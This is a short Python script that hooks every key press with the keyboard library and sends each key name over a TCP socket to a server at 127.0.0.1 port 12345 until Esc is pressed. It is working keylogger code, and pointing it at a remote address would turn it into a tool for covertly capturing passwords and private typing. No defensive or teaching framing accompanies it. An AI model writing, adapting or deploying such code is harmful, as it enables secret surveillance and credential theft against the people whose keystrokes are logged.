import keyboard
import socket
import sys

def send_message_to_server(message):
    print("Sending")
    s.sendall(message.encode())

def print_pressed_keys(key):
    print("Pressed: ", key.name)
    message = f"Key pressed: {key.name}"
    send_message_to_server(message)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 12345
connection_successful = False
s.connect(('127.0.0.1', port))
print("Connected")
connection_successful = True

keyboard.on_press(print_pressed_keys)
if not connection_successful:
    print("Failed to connect to the server")
    s.close()
    sys.exit()
keyboard.wait('esc')
s.close()
